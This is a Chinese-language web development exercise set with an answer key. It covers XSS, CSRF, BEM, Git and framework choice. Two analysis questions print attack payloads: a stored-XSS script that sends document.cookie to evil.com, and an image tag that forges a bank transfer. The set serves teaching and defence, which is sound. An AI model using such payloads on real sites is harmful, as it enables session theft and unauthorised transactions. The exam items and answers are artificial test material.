---
domain: 软件工程
subject: Web开发技术
type: exercise
chapter: 第7章 Web安全与开发规范
section: 7.1 XSS、CSRF基础防护
tags: [Web开发,习题,HTML,CSS,JavaScript]
prerequisites: []
---

# MOC - 第7章习题

> [!info] 习题说明
> 本章习题覆盖 XSS（存储型/反射型/DOM型/防护）、CSRF（原理/防护）、XSS vs CSRF 区别、HTML/CSS/JS 编码规范、BEM 命名、ESLint、Git 基本操作、前端框架（Vue/React/Angular）、后端框架（Express/Spring Boot/Django）等知识点。题目分为单选、多选、判断、简答、分析、综合六类，共 30 题，答案与解析折叠在 `<details>` 中。

## 知识点覆盖表

| 题号 | 题型 | 知识点 | 对应笔记 |
| --- | --- | --- | --- |
| 1 | 单选 | XSS 全称 | [[7.1 XSS、CSRF基础防护]] |
| 2 | 单选 | 存储型 XSS | [[7.1 XSS、CSRF基础防护]] |
| 3 | 单选 | 反射型 XSS | [[7.1 XSS、CSRF基础防护]] |
| 4 | 单选 | DOM 型 XSS | [[7.1 XSS、CSRF基础防护]] |
| 5 | 单选 | CSRF 原理 | [[7.1 XSS、CSRF基础防护]] |
| 6 | 单选 | XSS 防护 | [[7.1 XSS、CSRF基础防护]] |
| 7 | 单选 | CSRF 防护 | [[7.1 XSS、CSRF基础防护]] |
| 8 | 单选 | BEM 命名 | [[7.2 Web开发规范]] |
| 9 | 单选 | Git 基本命令 | [[7.2 Web开发规范]] |
| 10 | 单选 | 前端框架 | [[7.3 主流前后端框架简介]] |
| 11 | 多选 | XSS 类型 | [[7.1 XSS、CSRF基础防护]] |
| 12 | 多选 | XSS 防护手段 | [[7.1 XSS、CSRF基础防护]] |
| 13 | 多选 | CSRF 防护手段 | [[7.1 XSS、CSRF基础防护]] |
| 14 | 多选 | Git 命令 | [[7.2 Web开发规范]] |
| 15 | 多选 | 前端框架 | [[7.3 主流前后端框架简介]] |
| 16 | 判断 | CSRF 利用 Cookie | [[7.1 XSS、CSRF基础防护]] |
| 17 | 判断 | XSS 窃取 Cookie | [[7.1 XSS、CSRF基础防护]] |
| 18 | 判断 | HttpOnly 防 XSS 读取 | [[7.1 XSS、CSRF基础防护]] |
| 19 | 判断 | ESLint 作用 | [[7.2 Web开发规范]] |
| 20 | 判断 | Vue 双向绑定 | [[7.3 主流前后端框架简介]] |
| 21 | 简答 | XSS 类型与防护 | [[7.1 XSS、CSRF基础防护]] |
| 22 | 简答 | CSRF 原理与防护 | [[7.1 XSS、CSRF基础防护]] |
| 23 | 简答 | XSS vs CSRF | [[7.1 XSS、CSRF基础防护]] |
| 24 | 简答 | Git 工作流 | [[7.2 Web开发规范]] |
| 25 | 分析 | XSS 攻击场景 | [[7.1 XSS、CSRF基础防护]] |
| 26 | 分析 | CSRF 攻击场景 | [[7.1 XSS、CSRF基础防护]] |
| 27 | 分析 | BEM 命名应用 | [[7.2 Web开发规范]] |
| 28 | 分析 | 框架选型 | [[7.3 主流前后端框架简介]] |
| 29 | 综合 | 网站安全防护方案 | [[7.1 XSS、CSRF基础防护]] |
| 30 | 综合 | 项目工程化规范 | [[7.2 Web开发规范]] |

## 一、单选题（每题 2 分，共 10 题）

**1. XSS 的全称是？**

A. Cross Site Scripting
B. Cross Site Request Forgery
C. Client Side Scripting
D. Cascading Style Sheets

**2. 攻击者将恶意脚本提交到数据库，其他用户访问时触发的 XSS 类型是？**

A. 反射型
B. 存储型
C. DOM 型
D. 跨站型

**3. 攻击者构造恶意 URL 诱导用户点击，服务器将参数直接返回页面执行的 XSS 类型是？**

A. 存储型
B. 反射型
C. DOM 型
D. 持久型

**4. 完全在前端 JS 中因操作 DOM（如 innerHTML）导致恶意代码执行的 XSS 类型是？**

A. 存储型
B. 反射型
C. DOM 型
D. 服务端型

**5. CSRF 攻击的核心原理是？**

A. 窃取用户密码
B. 利用用户已登录身份，诱导其发起非自愿请求
C. 向服务器注入恶意脚本
D. 篡改前端 JS 代码

**6. 下列哪项是 XSS 的有效防护手段？**

A. 使用 GET 提交敏感数据
B. 对用户输入进行 HTML 转义
C. 关闭 HTTPS
D. 禁用 Cookie

**7. 下列哪项是 CSRF 的有效防护手段？**

A. 对输入进行 HTML 转义
B. 使用 CSP
C. 使用 CSRF Token
D. 使用 HttpOnly Cookie

**8. BEM 命名规范中，`block__element--modifier` 的 `--` 表示？**

A. 块
B. 元素
C. 修饰符
D. 状态

**9. Git 中将工作区修改提交到本地仓库的命令是？**

A. git add
B. git commit
C. git push
D. git pull

**10. 下列属于前端框架的是？**

A. Spring Boot
B. Django
C. Vue.js
D. Express

## 二、多选题（每题 3 分，共 5 题）

**11. 下列属于 XSS 类型的有？**（多选）

A. 存储型
B. 反射型
C. DOM 型
D. 网络型

**12. 下列属于 XSS 防护手段的有？**（多选）

A. 输入过滤与输出转义
B. 设置 Cookie HttpOnly
C. 使用 CSP（内容安全策略）
D. 使用 CSRF Token

**13. 下列属于 CSRF 防护手段的有？**（多选）

A. 使用 CSRF Token
B. 校验 Referer
C. 设置 Cookie SameSite 属性
D. 对输入进行 HTML 转义

**14. 下列属于 Git 常用命令的有？**（多选）

A. git clone
B. git commit
C. git push
D. git pull

**15. 下列属于前端框架/库的有？**（多选）

A. Vue.js
B. React
C. Angular
D. Spring Boot

## 三、判断题（每题 2 分，共 5 题）

**16. CSRF 攻击利用浏览器自动携带 Cookie 的机制，在用户不知情时发起请求。**

**17. XSS 攻击可以窃取用户的 Cookie，进而冒充用户身份。**

**18. 设置 Cookie 的 HttpOnly 属性可以防止 XSS 通过 JS 读取 Cookie。**

**19. ESLint 是用于检查 JavaScript 代码风格与潜在错误的工具。**

**20. Vue.js 通过双向数据绑定实现视图与模型的同步更新。**

## 四、简答题（每题 5 分，共 4 题）

**21. 说明 XSS 的三种类型（存储型、反射型、DOM 型）的原理与防护手段。**

**22. 说明 CSRF 的攻击原理，列举至少三种防护手段。**

**23. 对比 XSS 与 CSRF 的区别（原理、目标、防护）。**

**24. 简述 Git 的基本工作流程（工作区→暂存区→本地仓库→远程仓库）及常用命令。**

## 五、分析题（每题 8 分，共 4 题）

**25. 分析以下场景：某论坛允许用户发表评论，评论内容直接显示在页面。攻击者发表评论 `<script>fetch('http://evil.com?c='+document.cookie)</script>`。**
- 这是哪种 XSS 攻击？
- 攻击会造成什么后果？
- 应如何防护？

**26. 分析以下场景：用户已登录银行网站 A，未登出时访问恶意网站 B，B 页面包含 `<img src="http://bank.com/transfer?to=hacker&amount=10000">`。**
- 这是哪种攻击？
- 为什么会成功？
- 应如何防护？

**27. 给定 CSS 类名 `card`、`card__title`、`card__title--active`、`card__body`，用 BEM 规范分析其结构，并说明 BEM 命名的优点。**

**28. 某团队需开发一个中型电商后台管理系统，分析应如何在前端框架（Vue/React/Angular）与后端框架（Express/Spring Boot/Django）之间选型，说明理由。**

## 六、综合题（每题 12 分，共 2 题）

**29. 综合设计：某社交网站面临 Web 安全威胁，请设计完整的安全防护方案，覆盖：**
- XSS 防护（三种类型分别防护）
- CSRF 防护
- Cookie 安全属性
- HTTPS 与传输安全
- 用户输入校验
- 服务器端校验

请详细说明每项措施的具体实现方式。

**30. 综合设计：某团队需要为一个新项目建立工程化规范，请设计完整方案，覆盖：**
- 项目目录结构（前端 + 后端）
- HTML/CSS/JS 编码规范（含 BEM 命名）
- 代码检查工具（ESLint、Prettier）
- Git 工作流（分支策略、提交规范）
- 构建与部署流程
- 框架选型建议

请详细说明每项内容。

## 答案与解析

<details>
<summary>点击展开答案与解析</summary>

### 单选题答案

**1. 答案：A**
解析：XSS 全称 Cross Site Scripting（跨站脚本攻击），为与 CSS 区别缩写为 XSS。

**2. 答案：B**
解析：存储型 XSS 将恶意脚本存入数据库，其他用户访问时触发。

**3. 答案：B**
解析：反射型 XSS 通过构造恶意 URL，服务器将参数反射回页面执行。

**4. 答案：C**
解析：DOM 型 XSS 完全在前端 JS 中因操作 DOM（如 innerHTML）导致，不经过服务器。

**5. 答案：B**
解析：CSRF 利用用户已登录身份，诱导其发起非自愿请求。

**6. 答案：B**
解析：对用户输入进行 HTML 转义是 XSS 的有效防护手段。

**7. 答案：C**
解析：使用 CSRF Token 是 CSRF 的有效防护手段。

**8. 答案：C**
解析：BEM 中 `--` 表示修饰符（modifier），`__` 表示元素（element）。

**9. 答案：B**
解析：git commit 将暂存区的修改提交到本地仓库。git add 是添加到暂存区。

**10. 答案：C**
解析：Vue.js 是前端框架。Spring Boot、Django、Express 是后端框架。

### 多选题答案

**11. 答案：ABC**
解析：存储型、反射型、DOM 型是 XSS 的三种类型。

**12. 答案：ABC**
解析：输入过滤输出转义、HttpOnly、CSP 都是 XSS 防护手段。D 是 CSRF 防护手段。

**13. 答案：ABC**
解析：CSRF Token、Referer 校验、SameSite 都是 CSRF 防护手段。D 是 XSS 防护手段。

**14. 答案：ABCD**
解析：clone、commit、push、pull 都是 Git 常用命令。

**15. 答案：ABC**
解析：Vue.js、React、Angular 是前端框架/库。Spring Boot 是后端框架。

### 判断题答案

**16. 答案：正确（√）**
解析：CSRF 利用浏览器自动携带 Cookie 的机制发起非自愿请求。

**17. 答案：正确（√）**
解析：XSS 可窃取 Cookie 冒充用户身份。

**18. 答案：正确（√）**
解析：HttpOnly 防止 JS 通过 document.cookie 读取 Cookie。

**19. 答案：正确（√）**
解析：ESLint 检查 JS 代码风格与潜在错误。

**20. 答案：正确（√）**
解析：Vue 通过双向数据绑定（v-model）实现视图与模型同步。

### 简答题参考答案

**21. 参考答案**
- 存储型：恶意脚本存入数据库，其他用户访问触发。防护：输出转义、CSP。
- 反射型：恶意脚本通过 URL 参数反射回页面执行。防护：URL 参数过滤、输出转义。
- DOM 型：前端 JS 操作 DOM（如 innerHTML）注入恶意代码。防护：避免 innerHTML，使用 textContent，或对动态内容转义。

通用防护：输入过滤、输出转义（HTML/JS/URL 上下文）、CSP、HttpOnly Cookie。

**22. 参考答案**
CSRF 原理：用户登录网站 A 后未登出，访问恶意网站 B，B 利用用户对 A 的登录态（Cookie 自动携带）诱导发起非自愿请求。
防护手段：
1. CSRF Token：服务器下发随机 Token，请求需携带。
2. 校验 Referer：检查请求来源。
3. Cookie SameSite 属性：限制 Cookie 跨站发送。
4. 关键操作二次确认（验证码、密码）。

**23. 参考答案**
| 维度 | XSS | CSRF |
| --- | --- | --- |
| 原理 | 注入恶意脚本在受害者浏览器执行 | 利用用户登录态发起非自愿请求 |
| 目标 | 窃取数据、劫持会话、篡改页面 | 冒充用户执行操作（转账、改密） |
| 信任方向 | 信任用户输入 | 信任用户身份 |
| 防护 | 输入过滤、输出转义、CSP、HttpOnly | CSRF Token、Referer、SameSite |

**24. 参考答案**
Git 工作流程：
1. 工作区（Working Directory）：编辑文件。
2. 暂存区（Staging）：`git add` 将修改加入暂存区。
3. 本地仓库：`git commit` 将暂存区提交到本地仓库。
4. 远程仓库：`git push` 推送到远程，`git pull` 拉取远程更新。

常用命令：`git clone`（克隆）、`git status`（查看状态）、`git add`（添加）、`git commit`（提交）、`git push`（推送）、`git pull`（拉取）、`git branch`（分支）、`git merge`（合并）。

### 分析题参考答案

**25. 参考答案**
- 类型：存储型 XSS（恶意脚本存入数据库，其他用户访问触发）。
- 后果：用户访问评论页时执行恶意脚本，Cookie 被发送到 evil.com，攻击者可窃取用户会话、冒充身份。
- 防护：
  1. 输出转义：将 `<`、`>`、`"`、`'` 转义为 HTML 实体。
  2. 设置 Cookie HttpOnly，防止 JS 读取。
  3. 使用 CSP 限制脚本来源。
  4. 富文本场景使用白名单过滤（如 DOMPurify）。

**26. 参考答案**
- 类型：CSRF 攻击。
- 成功原因：用户已登录银行 A，浏览器访问 B 时发起对 A 的请求会自动携带 A 的 Cookie，银行服务器认为是用户本人操作，执行转账。
- 防护：
  1. CSRF Token：转账请求需携带服务器下发的随机 Token。
  2. 校验 Referer：检查请求来源是否为银行域名。
  3. Cookie SameSite=Strict/Lax：限制跨站发送。
  4. 关键操作二次确认（验证码、密码）。

**27. 参考答案**
BEM 结构：
- `card`：Block（块），独立的组件。
- `card__title`：Element（元素），块的子部分，用 `__` 连接。
- `card__title--active`：Modifier（修饰符），元素的状态或变体，用 `--` 连接。
- `card__body`：另一个元素。

优点：
1. 命名清晰，结构明确，避免冲突。
2. 扁平化命名，避免深层嵌套选择器，提升性能。
3. 易于维护与复用，组件化思想。
4. 团队协作时风格统一。

**28. 参考答案**
前端选型：
- Vue.js：学习曲线平缓，中文文档完善，适合中小型项目快速开发。后台管理系统常用 Element UI/Plus，生态成熟。推荐用于本项目。
- React：灵活强大，生态丰富，适合复杂交互与大型项目，但学习成本较高。
- Angular：企业级框架，规范严格，适合大型团队长期项目，但学习曲线陡峭。

后端选型：
- Express（Node.js）：轻量灵活，前后端同语言，适合 I/O 密集型与实时应用。
- Spring Boot（Java）：企业级稳定，生态完善，适合大型复杂业务，团队 Java 经验丰富时推荐。
- Django（Python）：开发效率高，自带 admin，适合内容管理与快速原型。

综合：中型电商后台推荐 Vue.js + Spring Boot，前端开发效率高，后端稳定可靠，适合中大型业务。

### 综合题参考答案

**29. 参考答案**
完整安全防护方案：

1. XSS 防护：
   - 存储型：所有用户输入（评论、帖子）在输出到页面前进行 HTML 转义（`<`→`&lt;` 等）；富文本用白名单过滤（DOMPurify）。
   - 反射型：URL 参数输出前转义；避免直接将参数插入 HTML。
   - DOM 型：避免 `innerHTML`，使用 `textContent`；对动态内容转义。

2. CSRF 防护：
   - 所有写操作（发帖、改资料）使用 CSRF Token，服务器校验。
   - 校验 Referer/Origin。
   - Cookie 设置 SameSite=Lax。

3. Cookie 安全属性：
   - HttpOnly：防止 JS 读取。
   - Secure：仅 HTTPS 传输。
   - SameSite：防 CSRF。
   - 合理设置 expires/max-age。

4. HTTPS 与传输安全：
   - 全站 HTTPS，强制 HSTS。
   - 使用 TLS 1.2+，禁用弱密码套件。
   - 证书由可信 CA 签发。

5. 用户输入校验：
   - 前端校验（即时反馈）+ 后端校验（安全兜底）。
   - 长度、格式、范围校验。
   - 禁用 SQL 关键字、HTML 标签。

6. 服务器端校验：
   - 所有请求后端必须重新校验，不信任前端。
   - 参数化查询防 SQL 注入。
   - 权限校验，防止越权。
   - 限流防暴力破解。

**30. 参考答案**
工程化规范方案：

1. 项目目录结构：
```
project/
├── frontend/                # 前端
│   ├── src/
│   │   ├── components/      # 公共组件
│   │   ├── views/           # 页面
│   │   ├── assets/          # 静态资源
│   │   ├── utils/           # 工具函数
│   │   ├── api/             # 接口请求
│   │   └── App.vue
│   ├── public/
│   └── package.json
├── backend/                 # 后端
│   ├── src/
│   │   ├── controllers/     # 控制器
│   │   ├── services/        # 业务逻辑
│   │   ├── models/          # 数据模型
│   │   ├── routes/          # 路由
│   │   └── utils/           # 工具
│   └── package.json
└── README.md
```

2. 编码规范：
   - HTML：语义化标签、缩进 2 空格、属性双引号。
   - CSS：BEM 命名（block__element--modifier）、避免 ID 选择器、统一缩进。
   - JS：使用 const/let、箭头函数、4 空格缩进、分号结尾、命名驼峰。

3. 代码检查工具：
   - ESLint：检查 JS 代码风格与错误，配置 Airbnb 或 Standard 规则。
   - Prettier：自动格式化代码。
   - Stylelint：检查 CSS 规范。
   - Husky + lint-staged：提交前自动检查。

4. Git 工作流：
   - 分支策略：main（生产）、develop（开发）、feature/*（功能）、fix/*（修复）、release/*（发布）。
   - 提交规范：Conventional Commits（feat:、fix:、docs:、refactor: 等）。
   - 流程：feature 分支开发 → PR/MR 代码审查 → 合并到 develop → 发布合并到 main。

5. 构建与部署：
   - 前端：Vite/Webpack 构建，输出到 dist。
   - 后端：Node.js 直接运行或 Docker 容器化。
   - CI/CD：GitHub Actions/GitLab CI 自动测试、构建、部署。
   - 部署：Nginx 反向代理 + PM2/Docker。

6. 框架选型：
   - 前端：Vue 3 + Vite + Pinia + Vue Router + Element Plus（适合中后台）。
   - 后端：Spring Boot（Java 生态成熟）或 Express（全栈 JS）。
   - 数据库：MySQL（关系型）+ Redis（缓存）。

</details>

## 考点统计表

| 题型 | 题数 | 分值 | 考查重点 |
| --- | --- | --- | --- |
| 单选题 | 10 | 20 | 基础概念识别（XSS/CSRF 类型与防护、BEM、Git、框架） |
| 多选题 | 5 | 15 | 综合属性辨析（XSS 类型、XSS/CSRF 防护、Git 命令、前端框架） |
| 判断题 | 5 | 10 | 易混点辨析（CSRF Cookie、XSS 窃取、HttpOnly、ESLint、Vue 双向） |
| 简答题 | 4 | 20 | 核心知识复述（XSS 类型、CSRF 原理、XSS vs CSRF、Git 工作流） |
| 分析题 | 4 | 32 | 原理分析（XSS 场景、CSRF 场景、BEM、框架选型） |
| 综合题 | 2 | 24 | 综合应用（安全防护方案、工程化规范） |
| 合计 | 30 | 121 | 覆盖第7章全部核心考点 |

## 章节导航

- 上一级：[[MOC - Web开发技术]]
- 本章知识点：[[MOC - 第7章]]
- 上一章习题：[[MOC - 第6章习题]]
